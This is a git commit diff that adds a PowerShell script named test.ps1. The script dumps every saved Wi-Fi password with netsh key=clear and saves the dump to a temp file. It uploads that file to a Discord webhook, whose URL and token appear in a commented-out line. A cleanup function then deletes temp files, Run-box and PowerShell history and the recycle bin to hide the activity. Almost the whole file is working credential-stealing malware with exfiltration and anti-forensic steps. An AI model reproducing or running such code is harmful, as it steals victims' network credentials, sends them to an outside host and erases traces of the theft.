75d6a9ed0f19ed5dfdf616200908147d2e507c92
nate <69339422+nanitt@users.noreply.github.com>
2023-06-11 23:30:24 -0400

    Update test.ps1

--- test.ps1
+++ test.ps1
@@ -1,1 +1,85 @@
+############################################################################################################################################################
 
+# MAKE LOOT FOLDER, FILE, and ZIP 
+
+$FolderName = "$env:USERNAME-LOOT-$(get-date -f yyyy-MM-dd_hh-mm)"
+
+$FileName = "$FolderName.txt"
+
+$ZIP = "$FolderName.zip"
+
+New-Item -Path $env:tmp/$FolderName -ItemType Directory
+
+############################################################################################################################################################
+
+#$dc = "https://discord.com/api/webhooks/1063617103481032714/JhXIXhH1lasiGVcfe1lCtiMB-DQC_krBYH-b7FdVSLFB53tK8xkl6Ge3CTA567g82cMA"
+
+
+
+
+
+
+
+
+
+
+
+
+$wifiProfiles = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize |  Out-String
+
+
+$wifiProfiles > $env:TEMP/--wifi-pass.txt
+
+############################################################################################################################################################
+
+function Upload-Discord {
+
+[CmdletBinding()]
+param (
+    [parameter(Position=0,Mandatory=$False)]
+    [string]$file,
+    [parameter(Position=1,Mandatory=$False)]
+    [string]$text 
+)
+
+$hookurl = "$dc"
+
+$Body = @{
+  'username' = $env:username
+  'content' = $text
+}
+
+if (-not ([string]::IsNullOrEmpty($text))){
+Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)};
+
+if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
+}
+
+if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file "$env:TEMP/--wifi-pass.txt"}
+
+ 
+
+############################################################################################################################################################
+
+function Clean-Exfil { 
+
+# empty temp folder
+rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
+
+# delete run box history
+reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f 
+
+# Delete powershell history
+Remove-Item (Get-PSreadlineOption).HistorySavePath -ErrorAction SilentlyContinue
+
+# Empty recycle bin
+Clear-RecycleBin -Force -ErrorAction SilentlyContinue
+
+}
+
+############################################################################################################################################################
+
+if (-not ([string]::IsNullOrEmpty($ce))){Clean-Exfil}
+
+
+RI $env:TEMP/--wifi-pass.txt
